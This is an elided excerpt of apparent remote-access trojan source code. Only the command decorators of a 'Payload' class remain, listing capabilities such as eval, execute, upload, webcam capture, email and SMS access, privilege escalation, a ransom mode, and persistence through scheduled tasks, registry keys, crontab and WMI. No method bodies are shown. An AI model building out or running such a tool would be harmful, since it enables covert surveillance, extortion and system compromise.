...
class Payload():
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self):
        """
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='set <cmd> [key=value]')
    def set(self, arg):
        """
        set client options
        """
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
    def sms(self, args):
        """
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='help')
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    ...
    @command(platforms=['win32','darwin'], inbox=collections.OrderedDict(), command=True, usage='email <option> [mode]')
    ...
    @command(platforms=['win32','linux2','darwin'], registry_key=r"Software\AngryEggplant", command=True, usage='ransom <mode> [path]')
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <path>')
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    ...
    @command(platforms=['win32'], command=True, usage='escalate')
    def escalate(self):
        """
    ...
    @command(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [mode]')
    ...
    @command(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job','powershell_wmi']}, command=True, usage='persistence <add/remove> [method]')
    ...
    @command(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='ps <mode> [args]')
    ...
    @command(platforms=['win32','linux2','darwin'], command=True, usage='abort')
    def abort(self):
        """
